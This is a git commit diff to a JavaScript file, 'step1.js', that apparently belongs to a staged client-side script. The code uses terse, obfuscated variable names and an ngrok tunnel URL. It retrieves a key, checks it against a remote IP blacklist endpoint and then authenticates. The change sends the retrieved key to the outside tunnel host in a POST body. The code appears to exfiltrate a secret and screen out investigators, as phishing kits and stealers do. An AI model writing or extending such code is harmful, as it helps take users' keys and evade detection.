a83e0dae44de2ed854eadfb243a82d5b22fb430a
kenftr <134454993+kenftr@users.noreply.github.com>
2025-08-27 11:20:57 +0700

    Update step1.js

--- step1.js
+++ step1.js
@@ -2,10 +2,13 @@
   const _U = "https://6398757a0a5d.ngrok-free.app",
         _J = JSON.stringify,
         _H = {"Content-Type": "application/json"};
-
   try {
     const key = await getKey(); 
-    let C = await (await fetch(_U + "/checkBlackListIp")).json();
+    let C = await (await fetch(_U + "/checkBlackListIp", {
+      method: "POST",
+      headers: _H,
+      body: _J({ key }) 
+    })).json();
     if (C.status === 100) return;
     let R = await (await fetch(_U + "/auth", {
       method: "POST",
